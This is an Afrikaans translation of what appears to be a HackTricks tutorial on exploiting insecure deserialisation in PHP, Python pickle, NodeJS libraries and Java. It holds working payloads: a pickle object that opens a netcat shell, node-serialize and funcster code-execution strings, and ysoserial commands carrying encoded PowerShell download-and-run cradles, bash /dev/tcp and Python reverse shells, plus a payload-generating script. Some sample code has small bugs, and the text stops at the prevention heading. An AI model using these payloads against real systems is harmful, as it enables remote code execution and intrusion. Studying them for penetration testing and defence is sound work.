# Deserialisasie

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>


## Basiese Inligting

**Serialisasie** word verstaan as die metode om 'n voorwerp in 'n formaat om te skakel wat behou kan word, met die doel om die voorwerp te stoor of dit as deel van 'n kommunikasieproses oor te dra. Hierdie tegniek word dikwels gebruik om te verseker dat die voorwerp op 'n latere tydstip herstel kan word, terwyl die struktuur en toestand behou word.

**Deserialisasie**, daarenteen, is die proses wat teenwerk aan serialisasie. Dit behels die neem van data wat in 'n spesifieke formaat gestruktureer is en dit terug te bou na 'n voorwerp.

Deserialisasie kan gevaarlik wees omdat dit potensieel **aanvallers in staat stel om die geserialiseerde data te manipuleer om skadelike kode uit te voer** of onverwagte gedrag in die toepassing te veroorsaak tydens die voorwerpherbouproses.


## PHP

In PHP word spesifieke sielkundige metodes gebruik tydens die serialisasie- en deserialisasieprosesse:

* `__sleep`: Word aangeroep wanneer 'n voorwerp geserialiseer word. Hierdie metode moet 'n reeks van die name van alle eienskappe van die voorwerp wat geserialiseer moet word, teruggee. Dit word gewoonlik gebruik om hangende data te bevestig of soortgelyke skoonmaaktake uit te voer.
* `__wakeup`: Word geroep wanneer 'n voorwerp gedeserialiseer word. Dit word gebruik om enige databasisverbindings te herstel wat dalk verlore gegaan het tydens serialisasie en om ander herinisialiseringstake uit te voer.
* `__unserialize`: Hierdie metode word geroep in plaas van `__wakeup` (as dit bestaan) wanneer 'n voorwerp gedeserialiseer word. Dit bied meer beheer oor die deserialisasieproses in vergelyking met `__wakeup`.
* `__destruct`: Hierdie metode word geroep wanneer 'n voorwerp op die punt staan om vernietig te word of wanneer die skripsie eindig. Dit word tipies gebruik vir skoonmaaktake, soos die sluit van l√™erhandvatsels of databasisverbindings.
* `__toString`: Hierdie metode maak dit moontlik om 'n voorwerp as 'n string te hanteer. Dit kan gebruik word om 'n l√™er te lees of ander take uit te voer gebaseer op die funksie-oproepe daarin, en bied dus 'n teksuele voorstelling van die voorwerp.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
As jy na die resultate kyk, kan jy sien dat die funksies **`__wakeup`** en **`__destruct`** geroep word wanneer die voorwerp gedeserializeer word. Let daarop dat in verskeie tutoriale jy sal vind dat die **`__toString`** funksie geroep word wanneer jy probeer om 'n eienskap te druk, maar blykbaar gebeur dit **nie meer nie**.

{% hint style="warning" %}
Die metode **`__unserialize(array $data)`** word geroep **in plaas van `__wakeup()`** as dit ge√Ømplementeer word in die klas. Dit stel jou in staat om die voorwerp te deserialiseer deur die geserialiseerde data as 'n array te voorsien. Jy kan hierdie metode gebruik om eienskappe te deserialiseer en enige nodige take uit te voer tydens deserialisering.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Jy kan 'n verduidelikte **PHP-voorbeeld hier lees**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), hier [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) of hier [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Jy kan die PHP autoload-funksionaliteit misbruik om willekeurige PHP-l√™ers en meer te laai:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializing Referenced Values

As jy om een ‚Äã‚Äãof ander rede 'n waarde wil serialize as 'n **verwysing na 'n ander serializeerde waarde**, kan jy dit doen:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial vir PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) kan jou help om payloads te genereer om PHP deserialisasies te misbruik.\
Let daarop dat jy in verskeie gevalle **nie 'n manier sal vind om 'n deserialisasie in die bronkode** van die toepassing te misbruik nie, maar jy mag dalk in staat wees om **die kode van eksterne PHP-uitbreidings te misbruik.**\
So, as jy kan, kyk na die `phpinfo()` van die bediener en **soek op die internet** (selfs op die **toestelle** van **PHPGGC**) vir moontlike toestelle wat jy kan misbruik.

### phar:// metadata deserialisasie

As jy 'n LFI gevind het wat net die l√™er lees en nie die PHP-kode daarin uitvoer nie, byvoorbeeld deur funksies soos _**file\_get\_contents(), fopen(), file() of file\_exists(), md5\_file(), filemtime() of filesize()**_**.** te gebruik. Jy kan probeer om 'n **deserialisasie** te misbruik wat plaasvind wanneer 'n **l√™er** met die **phar**-protokol gelees word.\
Vir meer inligting lees die volgende pos:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Wanneer die voorwerp ontgepickel word, sal die funksie _\_\_reduce\_\__ uitgevoer word.\
Wanneer dit uitgebuit word, kan die bediener 'n fout terugstuur.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Vir meer inligting oor ontsnapping uit **pickle-gevangenisse**, kyk:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

Die volgende bladsy bied die tegniek om 'n onveilige deserialisasie in yamls Python-biblioteke te **misbruik** en sluit af met 'n instrument wat gebruik kan word om RCE-deserialisasie-payloads te genereer vir **Pickle, PyYAML, jsonpickle en ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Klasverontreiniging (Python Prototipeverontreiniging)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Towerkunsfunksies

JS het nie soos PHP of Python **"towerkuns" funksies** wat uitgevoer word net om 'n voorwerp te skep nie. Maar dit het sommige **funksies** wat **gereeld gebruik word sonder om hulle direk aan te roep**, soos **`toString`**, **`valueOf`**, **`toJSON`**.\
As jy 'n deserialisasie misbruik, kan jy hierdie funksies **kompromitteer om ander kode uit te voer** (moontlik deur prototipeverontreiniging) en arbitr√™re kode uitvoer wanneer hulle geroep word.

'n Ander **"towerkuns" manier om 'n funksie te roep sonder om dit direk te roep, is deur 'n voorwerp wat deur 'n asynchrone funksie (belofte) teruggegee word, te **kompromitteer**. Want as jy daardie **terugvoer-voorwerp** omskep in 'n ander **belofte** met 'n **eienskap** genaamd **"then" van die tipe funksie**, sal dit **uitgevoer** word net omdat dit deur 'n ander belofte teruggegee word. _Volg_ [_**hierdie skakel**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _vir meer inligting._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` en `prototype` besoedeling

As jy meer wil leer oor hierdie tegniek, **kyk na die volgende handleiding**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Hierdie biblioteek maak dit moontlik om funksies te serialiseer. Voorbeeld:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
Die **geserialiseerde voorwerp** sal lyk soos:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Jy kan sien in die voorbeeld dat wanneer 'n funksie geserializeer word, die `_$$ND_FUNC$$_` vlag aan die geserializeerde objek geheg word.

Binne die l√™er `node-serialize/lib/serialize.js` kan jy dieselfde vlag en hoe die kode dit gebruik, vind.

![](<../../.gitbook/assets/image (297).png>)

![](<../../.gitbook/assets/image (298).png>)

Soos jy kan sien in die laaste stukkie kode, as die vlag gevind word, word `eval` gebruik om die funksie te deserialiseer, so basies word **gebruikerinvoer binne die `eval`-funksie gebruik**.

Nietemin, **slegs die serializeering** van 'n funksie sal dit nie uitvoer nie, aangesien dit nodig sou wees dat 'n deel van die kode **`y.rce` aanroep** in ons voorbeeld en dit is baie **onwaarskynlik**.\
In elk geval kan jy net die **geserializeerde objek wysig** deur enkele hakies by te voeg om die geserializeerde funksie outomaties uit te voer wanneer die objek gedeserializeer word.\
In die volgende stukkie kode **let op die laaste hakies** en hoe die `unserialize`-funksie die kode outomaties sal uitvoer:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Soos voorheen aangedui, sal hierdie biblioteek die kode na `_$$ND_FUNC$$_` kry en dit **uitvoer** deur gebruik te maak van `eval`. Om dus **kode outomaties uit te voer**, kan jy die gedeelte van die funksie-skepping en die laaste hakie **verwyder** en slegs 'n JS-eenre√´ler uitvoer, soos in die volgende voorbeeld:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Jy kan [**hier**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **verdere inligting** vind oor hoe om hierdie kwesbaarheid uit te buit.

### [funcster](https://www.npmjs.com/package/funcster)

'n Belangrike aspek van **funcster** is die ontoeganklikheid van **standaard ingeboude voorwerpe**; hulle val buite die toeganklike omvang. Hierdie beperking voorkom die uitvoering van kode wat probeer om metodes op ingeboude voorwerpe aan te roep, wat lei tot uitsonderings soos `"ReferenceError: console is not defined"` wanneer opdragte soos `console.log()` of `require(something)` gebruik word.

Ten spyte van hierdie beperking is dit moontlik om volle toegang tot die globale konteks, insluitend alle standaard ingeboude voorwerpe, te herstel deur middel van 'n spesifieke benadering. Deur die globale konteks direk te benut, kan hierdie beperking omseil word. Byvoorbeeld, toegang kan herstel word deur die volgende snipper te gebruik:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Vir** [**meer inligting lees hierdie bron**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Die **serialize-javascript** pakkie is eksklusief ontwerp vir serialisering doeleindes en het geen ingeboude deserialiseringseienskappe nie. Gebruikers is verantwoordelik vir die implementering van hul eie metode vir deserialisering. 'n Direkte gebruik van `eval` word voorgestel deur die amptelike voorbeeld vir die deserialisering van geserialiseerde data:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
As hierdie funksie gebruik word om voorwerpe te deserialiseer, kan jy dit **maklik uitbuit**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Vir** [**meer inligting lees hierdie bron**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo-biblioteek

Op die volgende bladsye kan jy inligting vind oor hoe om hierdie biblioteek te misbruik om willekeurige opdragte uit te voer:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

In Java, **deserialisering terugroepings word uitgevoer tydens die deserialisering proses**. Hierdie uitvoering kan deur aanvallers uitgebuit word deur kwaadwillige lading te skep wat hierdie terugroepings aktiveer, wat kan lei tot die uitvoering van skadelike aksies.

### Vingerafdrukke

#### Wit Boks

Om potensi√´le serialisering kwesbaarhede in die kodebasis te identifiseer, soek na:

* Klasses wat die `Serializable`-koppelvlak implementeer.
* Gebruik van `java.io.ObjectInputStream`, `readObject`, `readUnshare` funksies.

Let veral op:

* `XMLDecoder` wat gebruik word met parameters wat deur eksterne gebruikers gedefinieer is.
* `XStream` se `fromXML`-metode, veral as die XStream-weergawe gelyk is aan of minder as 1.46, aangesien dit vatbaar is vir serialiseringkwessies.
* `ObjectInputStream` gekoppel met die `readObject`-metode.
* Implementering van metodes soos `readObject`, `readObjectNodData`, `readResolve`, of `readExternal`.
* `ObjectInputStream.readUnshared`.
* Algemene gebruik van `Serializable`.

#### Swart Boks

Vir swart boks toetsing, soek na spesifieke **handtekeninge of "Magic Bytes"** wat Java-geserialiseerde voorwerpe aandui (afkomstig van `ObjectInputStream`):

* Heksadesimale patroon: `AC ED 00 05`.
* Base64-patroon: `rO0`.
* HTTP-reaksie-koppe met `Content-type` wat ingestel is op `application/x-java-serialized-object`.
* Heksadesimale patroon wat voorafgaande kompressie aandui: `1F 8B 08 00`.
* Base64-patroon wat voorafgaande kompressie aandui: `H4sIA`.
* Web-l√™ers met die `.faces`-uitbreiding en die `faces.ViewState`-parameter. Die ontdekking van hierdie patrone in 'n webtoepassing moet 'n ondersoek aanmoedig soos beskryf in die [berig oor Java JSF ViewState Deserialisering](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Kontroleer of dit kwesbaar is

As jy wil **leer oor hoe 'n Java Gedeserialiseerde aanval werk**, moet jy kyk na [**Basiese Java Gedeserialiseerde**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Gedeserialiseerde**](java-dns-deserialization-and-gadgetprobe.md), en [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### White Box Toets

Jy kan nagaan of daar enige toepassings ge√Ønstalleer is met bekende kwesbaarhede.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Jy kan probeer om **alle biblioteke** wat bekend is om kwesbaar te wees en waarvoor [**Ysoserial**](https://github.com/frohoff/ysoserial) 'n aanval kan voorsien, te **ondersoek**. Of jy kan die biblioteke nakyk wat aangedui word op [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Jy kan ook [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) gebruik om te soek na moontlike gadget-kettinge wat uitgebuit kan word.\
Wanneer jy **gadgetinspector** gebruik (nadat dit gebou is), maak nie saak oor die tonne waarskuwings/foute wat dit deurloop nie en laat dit voltooi. Dit sal al die bevindinge skryf onder _gadgetinspector/gadget-results/gadget-chains-jaar-maand-dag-uur-min.txt_. Let asseblief daarop dat **gadgetinspector nie 'n aanval sal skep nie en dit kan vals positiewe aandui**.

#### Swart Boks Toets

Met behulp van die Burp-uitbreiding [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) kan jy identifiseer **watter biblioteke beskikbaar is** (en selfs die weergawes). Met hierdie inligting kan dit **makliker wees om 'n lading te kies** om die kwesbaarheid uit te buit.\
[**Lees hierdie om meer te leer oor GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe fokus op **`ObjectInputStream` deserialisasies**.

Met die Burp-uitbreiding [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) kan jy **kwesbare biblioteke identifiseer** wat uitgebuit kan word met ysoserial en hulle **uitbuit**.\
[**Lees hierdie om meer te leer oor Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner fokus op **`ObjectInputStream`** deserialisasies.

Jy kan ook [**Freddy**](https://github.com/nccgroup/freddy) gebruik om deserialisasie-kwesbaarhede in **Burp** op te spoor. Hierdie invoegtoepassing sal **nie net `ObjectInputStream`** verwante kwesbaarhede opspoor nie, maar ook kwesbaarhede vanaf **Json** en **Yml** deserialisasie biblioteke. In aktiewe modus sal dit probeer om dit te bevestig deur gebruik te maak van slaap- of DNS-ladinge.\
[**Meer inligting oor Freddy is hier beskikbaar.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialisasie Toets**

Dit gaan nie net daaroor om te kyk of enige kwesbare biblioteek deur die bediener gebruik word nie. Soms kan jy in staat wees om die data binne die geserialiseerde voorwerp te verander en sekere kontroles te omseil** (miskien gee dit jou administratiewe voorregte binne 'n webtoepassing).\
As jy 'n Java geserialiseerde voorwerp vind wat na 'n webtoepassing gestuur word, **kan jy** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **gebruik om die geserialiseerde voorwerp wat gestuur word in 'n meer mensleesbare formaat af te druk**. Dit sal makliker wees om te weet watter data jy stuur en dit te wysig om sekere kontroles te omseil.

### **Uitbuiting**

#### **ysoserial**

Die belangrikste instrument om Java deserialisasies uit te buit, is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**laai hier af**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Jy kan ook oorweeg om [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) te gebruik wat jou in staat sal stel om komplekse opdragte te gebruik (met pype byvoorbeeld).\
Let daarop dat hierdie instrument **gefokus** is op die uitbuiting van **`ObjectInputStream`**.\
Ek sou **begin deur die "URLDNS"** lading **voor 'n RCE** lading te gebruik om te toets of die inspuiting moontlik is. In elk geval, let daarop dat die "URLDNS" lading dalk nie werk nie, maar 'n ander RCE lading wel.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Wanneer jy 'n payload skep vir **java.lang.Runtime.exec()**, kan jy **nie spesiale karakters** soos ">" of "|" gebruik om die uitvoer van 'n uitvoering te herlei nie, "$()" om opdragte uit te voer, of selfs **argumente** aan 'n opdrag oor te dra wat deur **spasies** geskei word (jy kan `echo -n "hello world"` doen, maar jy kan nie `python2 -c 'print "Hello world"'` doen nie). Om die payload korrek te enkodeer, kan jy [hierdie webwerf](http://www.jackson-t.ca/runtime-exec-payloads.html) gebruik.

Voel vry om die volgende skripsie te gebruik om **alle moontlike koderingsuitvoerings** payloads vir Windows en Linux te skep en dan op die kwesbare webblad te toets:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Jy kan **gebruik maak van** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **samen met ysoserial om meer exploits te skep**. Meer inligting oor hierdie instrument is beskikbaar in die **aantekeninge van die praatjie** waar die instrument voorgestel is: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec**](https://github.com/mbechler/marshalsec) kan gebruik word om payloads te genereer om verskillende **Json** en **Yml** serialisering biblioteke in Java te misbruik.\
Om die projek te kompileer, moes ek hierdie **afhanklikhede** by `pom.xml` **voeg**:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Installeer maven** en **kompileer** die projek:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Lees meer oor hierdie Java JSON-biblioteek: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratoriums

* As jy sommige ysoserial payloads wil toets, kan jy **hierdie webtoepassing uitvoer**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Waarom

Java gebruik baie serialisering vir verskeie doeleindes soos:

- **HTTP-aanvrae**: Serialisering word wyd gebruik in die bestuur van parameters, ViewState, koekies, ens.
- **RMI (Remote Method Invocation)**: Die Java RMI-protokol, wat uitsluitlik op serialisering staatmaak, is 'n hoeksteen vir afgele√´ kommunikasie in Java-toepassings.
- **RMI oor HTTP**: Hierdie metode word algemeen gebruik deur Java-gebaseerde dik klient-webtoepassings wat serialisering gebruik vir alle objekkommunikasie.
- **JMX (Java Management Extensions)**: JMX maak gebruik van serialisering vir die oordra van objekte oor die netwerk.
- **Aangepaste Protokolle**: In Java behels die standaardpraktyk die oordrag van rou Java-objekte, wat gedemonstreer sal word in komende uitbuitvoorbeelde.

### Voorkoming

#### Verganklike objekte

